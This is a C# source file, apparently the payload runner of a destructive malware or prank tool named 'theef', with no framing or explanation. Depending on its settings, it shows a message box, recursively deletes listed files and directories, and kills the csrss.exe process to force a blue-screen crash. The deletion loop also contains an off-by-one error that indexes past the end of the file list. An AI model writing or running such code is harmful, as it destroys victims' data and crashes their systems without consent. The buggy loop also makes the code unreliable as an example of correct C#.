using System;
using System.IO;
using System.Threading;
using System.Windows.Forms;

namespace theef
{
    internal class Runner
    {
        private Settings settings;

        public Runner(Settings settings)
        {
            this.settings = settings;

            // ========== Message Box ==========
            if (settings.MessageBoxEnabled == 1)
            {
                MessageBox.Show(settings.MessageBoxText, settings.MessageBoxTitle, settings.MessageBoxButtons, settings.MessageBoxIcon);
            }

            // ========== Delete File(s) ==========
            if (settings.DeleteFiles == 1)
            {
                // Go through the file(s) listed.
                for (int i = 0; i <= settings.Files.Length; i++)
                {
                    Console.WriteLine(settings.Files[i]);
                    // Check if the string is a directory
                    if (settings.Files[i].EndsWith("\\"))
                    {
                        // First arg is file path, 2nd is recursive file deletion or not.
                        Directory.Delete(settings.Files[i], true);
                    }
                    else
                    {
                        // NOTICE: You cant have a \n before or after the directory listings
                        File.Delete(settings.Files[i]);
                    }
                }
            }

            // ========== BSOD (blue screen of death) ==========
            if(settings.BsodEnabled == 1)
            {
                // Sleep for the set ammount of time.
                Thread.Sleep(settings.BsodDelay);

                // Killing the process csrss.exe causes a bsod.
                System.Diagnostics.Process.GetProcessesByName("csrss")[0].Kill();
            }
        }
    }
}